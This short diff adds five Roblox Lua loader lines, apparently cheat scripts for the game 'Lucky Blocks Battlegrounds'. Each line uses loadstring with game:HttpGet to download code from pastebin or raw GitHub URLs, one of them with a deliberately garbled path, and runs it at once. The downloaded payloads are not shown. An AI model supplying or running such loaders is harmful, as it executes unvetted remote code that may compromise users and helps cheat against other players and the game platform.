@@ -1,0 +1,5 @@
+loadstring(game:HttpGet("https://pastebin.com/raw/JbWJ7R7i", true))();
+loadstring(game:HttpGet("https://raw.githubusercontent.com/fired-away/Lucky-Blocks-Battlegrounds/main/script.lua"))();
+loadstring(game:HttpGet("https://pastebin.com/raw/YzVmSVF9", true))();
+loadstring(game:HttpGet("https://raw.githubusercontent.com/9ur98wh8fjkerbngo12ikontgg/fortnite/main/locky%20blocks12nyhubf87yh189j98ihuygrweyugf12ou8r", true))();
+loadstring(game:HttpGet("https://raw.githubusercontent.com/Monke90/Lucky-Blocks/main/Monkeyware"))();
